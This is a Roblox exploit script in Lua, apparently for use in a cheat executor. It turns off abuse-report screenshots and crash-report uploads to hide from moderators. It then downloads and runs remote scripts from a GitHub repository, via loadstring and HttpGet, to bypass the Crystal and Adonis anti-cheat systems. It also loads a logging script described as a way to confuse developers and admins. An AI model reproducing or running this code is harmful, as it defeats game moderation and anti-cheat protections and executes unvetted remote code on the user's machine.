if not game.Loaded then
    game.Loaded:Wait()
end

print("working...")
-- setting flags
setfflag("AbuseReportScreenshotPercentage", 0)
setfflag("DFFlagAbuseReportScreenshot", "False")
setfflag("DFStringCrashPadUploadToBacktraceToBacktraceBaseUrl", "")
setfflag("DFIntCrashUploadToBacktracePercentage", "0")
setfflag("DFStringCrashUploadToBacktraceBlackholeToken", "")
wait(0.1)
-- there anti is so they need to be executed a little bit later or they won't load
-- AntiCheatV2 by IrisV3rm
-- if its anything else if will just execute default

local bgames = {
    crystal = {
        Name = "Crystal",
        PlaceIDs = {6006653296},
        ScriptToRun = "https://raw.githubusercontent.com/Input50/Something/master/CAC.lua",
    },
    
    adonis = {
        Name = "Adonis",
        PlaceIDs = {2772166173, 920587237, 286090429, 6539893534},
        ScriptToRun = "https://raw.githubusercontent.com/Input50/Something/master/AAC.lua",
    },
}
un = true
for _, bgame in pairs(bgames) do
    for _, placeid in pairs(bgame.PlaceIDs) do
        if placeid == game.PlaceId then
            loadstring(game:HttpGet((bgame.ScriptToRun),true))()
            print("Loaded "..bgame.Name)
            un = false
        end
    end
end
if un == true then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Input50/Something/master/DAC.lua"))()
    print("Loaded ".. game.Name)
end	
print("Loading Logs ...")

-- Full protection with sensible logs that are common to confuse any dev or admin
loadstring(game:HttpGet(("https://raw.githubusercontent.com/Input50/Something/master/Logs.lua"),true))()

local plr = game:GetService("Players").LocalPlayer
local HRP = game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

plr.CharacterAdded:Connect(function()
wait(0.1)

for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
    if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
        game:GetService("RunService").Heartbeat:Connect(function()
        v.Velocity = Vector3.new(-30,0,0)
        end)
    end
    end
	print("Player respawned")
end)